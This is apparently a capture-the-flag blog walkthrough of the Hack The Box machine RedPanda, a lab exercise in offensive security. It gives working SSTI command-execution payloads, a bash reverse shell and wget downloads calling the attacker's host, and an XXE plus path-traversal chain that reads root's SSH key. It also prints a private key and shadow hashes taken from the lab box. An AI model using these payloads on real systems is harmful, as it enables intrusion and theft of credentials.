---
layout: single
title: RedPanda - Hack The Box
excerpt: "RedPanda is a very cute easy-rated Linux machine from Hack The Box. I can see why it's rated as easy, but for someone with limited Java experience I found it a bit rough on the root part. But as long as you take it nice and easy, and really make sure to have all your ducks in a row, you will root it without too much headache. Personally I found this box to be quite fun with the short stories about the different red pandas. The box is short box and straight to the point which I also enjoy. In the end I didn't learn anything new, but I definitely refined my code review skills in Java. "
date: 2022-08-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-redpanda/redpanda_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
tags:  
  - linux
  - easy
  - ssti
  - java
  - jd-gui
  - xxe
---

![](/assets/images/htb-writeup-redpanda/redpanda_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

RedPanda is a very cute easy-rated Linux machine from Hack The Box. I can see why it's rated as easy, but for someone with limited Java experience I found it a bit rough on the root part. However, as long as you take it nice and easy and really make sure to have all your ducks in a row, you will root it without too much headache. Personally I found this box to be quite fun with the short stories about the different red pandas. The box is short box and straight to the point which I also enjoy. In the end I didn't learn anything new, but I definitely refined my code review skills in Java. 

<br>
<br>

----------------

# USER

### Step 1
**nmap:**
```bash
➜  redpanda nmap -Pn -n -p- 10.10.11.170
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 20:25 CEST
Nmap scan report for 10.10.11.170
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy


➜  redpanda nmap -Pn -n -sCV -p22,8080 10.10.11.170 --open
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 15 Aug 2022 18:26:55 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 15 Aug 2022 18:26:55 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 15 Aug 2022 18:26:55 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
```

Visiting port 8080 we find the RedPanda search page, where we can search for different pandas. 

![](/assets/images/htb-writeup-redpanda/redpanda01.png)

Since this is an easy box, lets just search for something random, capture it in Burp and throw whatever we got at it; SQLi, SSTI, XXE etc.

With SSTI we find something interesting:
![](/assets/images/htb-writeup-redpanda/redpanda02.png)
![](/assets/images/htb-writeup-redpanda/redpanda03.png)

### Step 2
Both `@(6+5)` and `#{3*3}` is calculated however everything starting with `$` is blacklisted.. Looking on the syntax we can figure out that the backend is java, which is also seen in the website title (_"Made with Spring Boot"_). 

We can bypass this blacklist by replacing `$` with `*` instead, and are now able to extract some environment information:
```bash
## Request
POST /search HTTP/1.1
Host: 10.10.11.170:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.10.11.170:8080
Connection: close
Referer: http://10.10.11.170:8080/
Upgrade-Insecure-Requests: 1

name=*{T(java.lang.System).getenv()}

## Response:
[... snip ...]
<h2 class="searched">
You searched for: {PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}
</h2>
```

Going to Github [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java) we find a one-liner to execute commands, and with this we're able get callbacks from the victim:
```bash
## Request
name=*{T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.6/test')}

## Callback
➜  redpanda python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.170 - - [15/Aug/2022 21:37:09] code 404, message File not found
10.10.11.170 - - [15/Aug/2022 21:37:09] "GET /test HTTP/1.1" 404 -
```

Trying a bunch of one-liners fails, I am not able to get a reverse shell. So instead we go to create a payload and upload it to the victim.

```bash
➜  redpanda echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" > revshell.sh
```

```bash
## Request 1 - Upload
name=*{T(java.lang.Runtime).getRuntime().exec('wget http://10.10.14.6/revshell.sh')}

## Request 2 - Execute
name=*{T(java.lang.Runtime).getRuntime().exec('bash revshell.sh')}
```

```bash
➜  redpanda nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.170] 32894
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ 

woodenk@redpanda:~$ cat user.txt
4f591f5aaa56e50ec3bb7ac485cc81c3
```

-------
# Root
### Step 1
* We're unable to run `sudo -l` due to the lack of password
* The directory `.ssh` doesn't exist so we can't steal `id_rsa` for persistance

Manually enumerating the box we find the sensitive web files at `/opt/panda_search`. Digging deeper we find the sql connection including the password for user `Woodenk`.

```bash
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java
[... snip ...]
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```

Looking in the MySQL Server there's nothing of use however, only pictures of red pandas.

Before enumerating automatically with linPEAS etc I like to use `pspy64` to see if there's anything obvious being executed as root that we can exploit, so lets look at that.

```bash
woodenk@redpanda:/dev/shm$ wget http://10.10.14.6/pspy64
woodenk@redpanda:/dev/shm$ chmod +x pspy64 
woodenk@redpanda:/dev/shm$ ./pspy64
[... snip ...]
2022/08/16 10:36:01 CMD: UID=0    PID=18234  | /bin/sh -c /root/run_credits.sh 
2022/08/16 10:36:01 CMD: UID=0    PID=18233  | /usr/sbin/CRON -f 
2022/08/16 10:36:01 CMD: UID=0    PID=18236  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2022/08/16 10:36:01 CMD: UID=0    PID=18235  | /bin/sh /root/run_credits.sh 
2022/08/16 10:36:53 CMD: UID=0    PID=18257  | 
2022/08/16 10:38:01 CMD: UID=0    PID=18270  | /usr/sbin/CRON -f 
2022/08/16 10:38:01 CMD: UID=0    PID=18271  | /bin/sh -c /root/run_credits.sh 
2022/08/16 10:38:01 CMD: UID=0    PID=18272  | /bin/sh /root/run_credits.sh 
2022/08/16 10:38:01 CMD: UID=0    PID=18273  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
```

Okay so we see a .jar-file being executed every 2 minutes by root (UID=0), lets download that file and investigate it.

```bash
➜  redpanda nc -lp 1234 > final-1.0-jar-with-dependencies.jar
woodenk@redpanda:/opt/credit-score/LogParser/final/target$ nc -w 3 10.10.14.6 1234 < final-1.0-jar-with-dependencies.jar
```


### Step 2 
The jar-file has a lot to unpack and you really need focus to keep your ducks in a row. I use **jd-gui** to open and analyze the jar. 
Ill try to go through all the requirements, step by step, and what we need to do to pass to code execution through **XXE**.

**Application Code:**
```java
public class App {
  public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }
  
  public static boolean isImage(String filename) {
    if (filename.contains(".jpg"))
      return true; 
    return false;
  }
  
  public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for (Directory dir : metadata.getDirectories()) {
      for (Tag tag : dir.getTags()) {
        if (tag.getTagName() == "Artist")
          return tag.getDescription(); 
      } 
    } 
    return "N/A";
  }
  
  public static void addViewTo(String path, String uri) throws JDOMException, IOException {
    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());
    File fd = new File(path);
    Document doc = saxBuilder.build(fd);
    Element rootElement = doc.getRootElement();
    for (Element el : rootElement.getChildren()) {
      if (el.getName() == "image")
        if (el.getChild("uri").getText().equals(uri)) {
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));
        }  
    } 
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
    xmlOutput.output(doc, writer);
  }
  
  public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
      String line = log_reader.nextLine();
      if (!isImage(line))
        continue; 
      Map parsed_data = parseLog(line);
      System.out.println(parsed_data.get("uri"));
      String artist = getArtist(parsed_data.get("uri").toString());
      System.out.println("Artist: " + artist);
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
  }
}
```

Starting from main, the jar-file opens `/opt/panda_search/redpanda.log` and reads the output, line by line, top down. 
Note that we have read+write over the file as it's owned by group `logs`.

```
woodenk@redpanda:/dev/shm$ ls -al /opt/panda_search/redpanda.log 
-rw-rw-r-- 1 root logs 280 Aug 16 12:46 /opt/panda_search/redpanda.log
woodenk@redpanda:/dev/shm$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

**Below are the steps we need to understand:**
1. Verify that `.jpg` is present in `redpanda.log`
```java
## MAIN
File log_fd = new File("/opt/panda_search/redpanda.log");
Scanner log_reader = new Scanner(log_fd);
while (log_reader.hasNextLine()) {
  String line = log_reader.nextLine();
  if (!isImage(line))
    continue; 

## isImage
public static boolean isImage(String filename) {
    if (filename.contains(".jpg"))
      return true; 
    return false;
```

2. When a line with `.jpg` is found, send the line to be parsed by function `parseLog`.  `parseLog` will separate the line and return four callable chunks; (1) `status_code`, (2) `ip`, (3) `user_agent` & (4) `uri`. Again, note that we can controll the `uri` parameter as we (group ``logs``) own `redpanda.log`.
```java
## MAIN
Map parsed_data = parseLog(line);
System.out.println(parsed_data.get("uri"));
```

3. The `uri` parameter is sent to `getArtist` function where it will look for the image in `/opt/panda_search/src/main/resources/static`, which is the default path for the `img` directory where all red panda images are stored. Since we controll `uri` we can use path traversal and look for the image else where, example  `/../../../../../../dev/shm/e.jpg`.
```java
## MAIN
String artist = getArtist(parsed_data.get("uri").toString());

## getArtist
public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
```

4. The meta data from found image will be checked, and the value of `Artist` will be returned to main, which will be used to create a path to a XML-file. Since we're pointing to our custom image, we can controll the metadata with `exiftool` and use path traversal again to our own XML-file. Example, `exiftool -Artist="../dev/shm/pwn" e.jpg`, creating the xmlPath `/credits/../dev/shm/pwn_creds.xml`.
```java
## getArtist
 Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
 for (Directory dir : metadata.getDirectories()) {
  for (Tag tag : dir.getTags()) {
    if (tag.getTagName() == "Artist")
 	 return tag.getDescription(); 

## MAIN
 System.out.println("Artist: " + artist);
 String xmlPath = "/credits/" + artist + "_creds.xml";
```

5. Lastly all our controlled data is sent to function `addViewTo`, `xmlPath` is set to `/credits/../dev/shm/pwn_creds.xml` and `uri` to `/../../../../../../dev/shm/e.jpg`. 
- The element `uri` (in the XML-file) is compared to variable `uri` to make sure they are the same. This means that we need to set `<uri>/../../../../../../dev/shm/e.jpg</uri>` in our XML, else this wont pass
- `totalviews` are calculated, meaning we need to have `<totalviews></totalviews>` in our XML
- `views` are calculcated, same as above, we need to have `<views></views>` in our XML
```java
## MAIN
addViewTo(xmlPath, parsed_data.get("uri").toString());

## addViewTo
File fd = new File(path);
    Document doc = saxBuilder.build(fd);
    Element rootElement = doc.getRootElement();
    for (Element el : rootElement.getChildren()) {
      if (el.getName() == "image")
        if (el.getChild("uri").getText().equals(uri)) {
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));
        }  
    } 
```

With all this in mind, we can download one of the xml-files at `/credits/` and use as a base. Remember that the file name here is important as it will work together with the image metadata.
```bash
➜  redpanda cat pwn_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>pwn</author>
  <image>
    <uri>/../../../../../../dev/shm/e.jpg</uri>
    <foo>&xxe;</foo>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Next, change the metadata of a random image:
```bash
➜  redpanda exiftool -Artist="../dev/shm/pwn" e.jpg
➜  redpanda exiftool e.jpg | grep Artist
Artist                          : ../dev/shm/pwn
```

Upload the xml and image to the victim, and write your path traversal in `redpanda.log`. Wait for maximum two minutes until the jar is executed again and the xml-file should now contain the content of root `id_rsa`. 
```bash
woodenk@redpanda:/dev/shm$ wget http://10.10.14.6:8888/pwn_creds.xml
woodenk@redpanda:/dev/shm$ wget http://10.10.14.6:8888/e.jpg
woodenk@redpanda:/dev/shm$ echo "200||IP-ADDR||USERAGENT||/../../../../../../dev/shm/e.jpg" > /opt/panda_search/redpanda.log

woodenk@redpanda:/dev/shm$ cat pwn_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>pwn</author>
  <image>
    <uri>/../../../../../../dev/shm/e.jpg</uri>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
    <views>1</views>
  </image>
  <totalviews>1</totalviews>
</credits>

```

Write to file, login and win.
```bash
➜  redpanda vim root-id_rsa
➜  redpanda chmod 400 root-id_rsa 
➜  redpanda ssh root@redpanda.htb -i root-id_rsa

root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)

root@redpanda:~# cat root.txt 
84d3faba94901c92ecd00838f38ef288

root@redpanda:~# cat /etc/shadow
root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::
woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::
```


## References
- [PortSwigger - XXE](https://portswigger.net/web-security/xxe)
- [PayloadAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java) 
